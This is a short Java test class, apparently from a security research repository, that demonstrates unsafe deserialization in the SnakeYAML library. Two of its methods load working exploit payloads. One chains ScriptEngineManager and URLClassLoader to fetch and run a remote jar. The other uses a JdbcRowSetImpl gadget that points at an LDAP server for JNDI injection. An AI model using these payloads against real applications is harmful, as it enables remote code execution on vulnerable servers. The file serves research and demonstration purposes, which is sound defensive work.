package com.threedr3am.bug.spring.actuator.snakeyaml;

import com.threedr3am.bug.common.server.LdapServer;
import java.util.HashMap;
import java.util.Map;
import org.yaml.snakeyaml.Yaml;

/**
 * @author threedr3am
 */
public class SnakeYamlTest {

  public static void main(String[] args) {
    testNewInstance();
    testAttack();
    testAttack2();
  }

  public static void testNewInstance() {
    Yaml yaml = new Yaml();
    Map<Object, Object> map = new HashMap<>();
    map.put("111", new A("xxx"));
    System.out.println(yaml.dump(map));;
    yaml.load("!!com.threedr3am.bug.spring.actuator.snakeyaml.A [\"threedr3am\"]");
  }

  public static void testAttack() {
    Yaml yaml = new Yaml();
    yaml.load("'111': !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://127.0.0.1:80/common-1.0-SNAPSHOT.jar']]]]");
  }

  public static void testAttack2() {
    new Thread(() -> LdapServer.run()).start();
    Yaml yaml = new Yaml();
    yaml.load("!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: ldap://127.0.0.1:43658/Calc\n  autoCommit: true");
  }

}
